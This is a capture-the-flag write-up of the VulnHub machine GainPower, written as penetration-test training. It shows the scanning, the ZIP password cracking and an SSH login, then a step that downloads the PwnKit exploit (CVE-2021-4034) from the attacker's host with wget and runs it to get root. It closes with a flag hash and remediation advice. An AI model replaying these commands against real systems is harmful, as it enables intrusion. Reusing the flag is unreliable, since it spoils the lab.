# GainPower — VulnHub Writeup
### Privilege Escalation: PwnKit (CVE-2021-4034)

> **Platform:** VulnHub  
> **Difficulty:** Intermediate  
> **OS:** CentOS Linux  
> **IP:** 192.168.56.132  
> **Author:** [Primenexuss](https://github.com/PrimeNexuss) | Nex-Experience  
> **Result:** ✅ Root Compromised  

---

## Table of Contents

- [Overview](#overview)
- [Tools Used](#tools-used)
- [Reconnaissance](#reconnaissance)
  - [Network Discovery](#network-discovery)
  - [Port Scan](#port-scan)
  - [Web Enumeration](#web-enumeration)
- [Initial Foothold](#initial-foothold)
  - [Directory Discovery & File Extraction](#directory-discovery--file-extraction)
  - [Password Cracking](#password-cracking)
  - [SSH Access](#ssh-access)
- [Privilege Escalation — PwnKit (CVE-2021-4034)](#privilege-escalation--pwnkit-cve-2021-4034)
  - [SUID Enumeration](#suid-enumeration)
  - [Exploit Transfer & Execution](#exploit-transfer--execution)
- [Flags](#flags)
- [Vulnerabilities Summary](#vulnerabilities-summary)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Remediation](#remediation)

---

## Overview

GainPower is a CentOS-based VulnHub machine simulating a corporate internal web environment. The attack chain begins with web enumeration revealing an exposed `/secret/` directory, progresses through password cracking and SSH credential reuse, and ends with privilege escalation to root using the **PwnKit exploit (CVE-2021-4034)** — a critical local privilege escalation vulnerability in the Linux PolicyKit `pkexec` binary.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` | Network host discovery |
| `nmap` | Port scanning & service enumeration |
| `nikto` | Web vulnerability scanning |
| `zip2john` | ZIP hash extraction |
| `john` | Password cracking (rockyou.txt) |
| `7z` | Archive extraction |
| `python3 -m http.server` | Serving PwnKit exploit binary |
| `wget` | Downloading exploit to target |
| `PwnKit` | CVE-2021-4034 privilege escalation exploit |
| `find` | SUID binary enumeration |

---

## Reconnaissance

### Network Discovery

```bash
netdiscover -r 192.168.56.0/24
```

Target identified at `192.168.56.132`.

![netdiscover](screenshots/netdiscover__5_.png)

---

### Port Scan

```bash
sudo nmap -Pn -sV -sC -T5 -p- 192.168.56.132
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22/TCP | SSH | OpenSSH 7.4 |
| 80/TCP | HTTP | Apache 2.4.6 (CentOS) |
| 8000/TCP | HTTP | Ajenti Control Panel |

![nmap](screenshots/nmap.png)

---

### Web Enumeration

Port 80 hosts a watch shop web application called **Time Zone**. Wappalyzer fingerprinting identified Apache 2.4.6 on CentOS with jQuery 1.12.4 and Bootstrap 4.0.

Port 8000 exposes an **Ajenti admin panel** transmitting credentials over plaintext HTTP.

```bash
nikto -h http://192.168.56.132
```

Nikto identified several issues including:
- `/secret/` — directory listing enabled
- `/login.html` — admin login page
- HTTP TRACE method enabled (XST risk)
- Outdated Apache version

![port80](screenshots/port_80__1_.png)
![nikto](screenshots/nikto.png)
![port8000](screenshots/port_8000.png)
![wappalyzer](screenshots/banner_grabbing.png)

---

## Initial Foothold

### Directory Discovery & File Extraction

The `/secret/` directory was accessible without authentication and contained JPEG image files along with a password-protected ZIP archive.

```
http://192.168.56.132/secret/
```

![secret](screenshots/secret.png)

The `secret.zip` archive was downloaded and its PKZIP hash extracted for offline cracking:

```bash
zip2john secret.zip > secret
cat secret
```

![zip2john](screenshots/zip2john.png)
![cat_secret](screenshots/cat_secret.png)

---

### Password Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt secret
```

Password cracked in under 1 second: **`81237900`**

```bash
7z x secret.zip
# Enter password: 81237900
```

![john](screenshots/john.png)
![7z](screenshots/7z.png)

---

### SSH Access

Connecting to the SSH service on port 22 revealed a custom MOTD banner that **disclosed the username format** before authentication:

> *"I HOPE EVERYONE KNOW THE JOINING ID CAUSE THAT IS YOUR USERNAME : ie : employee1 employee2 ... so on ;)"*

This combined with the cracked password allowed direct access as `employee1`:

```bash
ssh employee1@192.168.56.132
# Password: 81237900
```

![ssh_login](screenshots/ssh_login.png)
![employee1](screenshots/employee1.png)

---

## Privilege Escalation — PwnKit (CVE-2021-4034)

### SUID Enumeration

From the `employee1` shell, SUID binaries were enumerated:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/pkexec` was identified — the binary affected by **CVE-2021-4034 (PwnKit)**, a critical privilege escalation vulnerability in the Linux PolicyKit component.

![perm](screenshots/perm.png)

---

### Exploit Transfer & Execution

A Python HTTP server was started on Kali to serve the PwnKit exploit binary:

```bash
# On Kali
python -m http.server 8999
```

![python_server](screenshots/python_server__1_.png)
![binaries](screenshots/binaries.png)

The exploit was downloaded onto the target, made executable, and run:

```bash
# On target
cd /tmp
wget http://192.168.56.1:8999/PwnKit
chmod +x PwnKit
./PwnKit
```

![PwnKit](screenshots/PwnKit.png)
![chmod](screenshots/chmod_Pwnkit.png)

**Root shell obtained immediately.**

```bash
whoami
# root
```

![home_directory](screenshots/home_directory__1_.png)

---

## Flags

```bash
cd /root
cat proof.txt
```

![root_flag](screenshots/root_flag__4_.png)

| Flag | Hash |
|------|------|
| 🏁 Root Flag | `eb2e174c3883ff6b5fd871167795b4d6` |

---

## Vulnerabilities Summary

| # | Vulnerability | CVSS | CVE |
|---|--------------|------|-----|
| 1 | Apache Directory Listing (`/secret/`) | 5.3 Medium | N/A |
| 2 | Sensitive File Exposure (ZIP in web root) | 6.5 Medium | N/A |
| 3 | Weak Archive Password / Credential Reuse | 7.5 High | N/A |
| 4 | SSH Banner Username Disclosure | 5.3 Medium | N/A |
| 5 | Privilege Escalation via PwnKit (pkexec SUID) | 7.8 High | CVE-2021-4034 |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|----------|-----|
| Reconnaissance | Active Scanning | T1595 |
| Initial Access | Valid Accounts | T1078 |
| Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Command and Scripting Interpreter | T1059 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Local System | T1005 |
| Defense Evasion | File & Directory Permissions Modification | T1222 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation

| Finding | Fix |
|---------|-----|
| Apache directory listing | Add `Options -Indexes` to Apache config |
| Sensitive files in web root | Move archives outside of publicly accessible directories |
| Weak password | Enforce strong password policy (min 14 chars, no numeric-only) |
| SSH banner disclosure | Remove or sanitize MOTD — no username hints or internal info |
| PwnKit (CVE-2021-4034) | `sudo yum update polkit` or temporarily: `chmod 0755 /usr/bin/pkexec` |

---

> **Disclaimer:** This writeup is for educational purposes only. The machine was compromised in an isolated VirtualBox lab environment on VulnHub. Do not use these techniques against systems you do not own or have explicit permission to test.

---

*Written by [Primenexuss](https://github.com/PrimeNexuss) | Nex-Experience*
